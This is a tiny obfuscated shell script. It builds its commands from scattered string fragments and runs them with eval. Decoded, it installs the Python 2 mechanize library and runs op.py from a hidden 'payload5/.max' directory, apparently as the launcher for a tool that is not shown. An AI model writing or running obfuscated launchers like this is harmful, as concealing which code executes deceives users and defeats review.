z="
";Bz='r';Rz='op.p';Gz=' mec';Kz='HOME';Az='clea';Cz='cd';Mz='load';Ez=' ins';Hz='hani';Fz='tall';Nz='5/.m';Jz='cd $';Oz='ax';Lz='/pay';Dz='pip2';Sz='y';Qz='on2 ';Iz='ze';Pz='pyth';
eval "$Az$Bz$z$Cz$z$Dz$Ez$Fz$Gz$Hz$Iz$z$Jz$Kz$Lz$Mz$Nz$Oz$z$Az$Bz$z$Pz$Qz$Rz$Sz"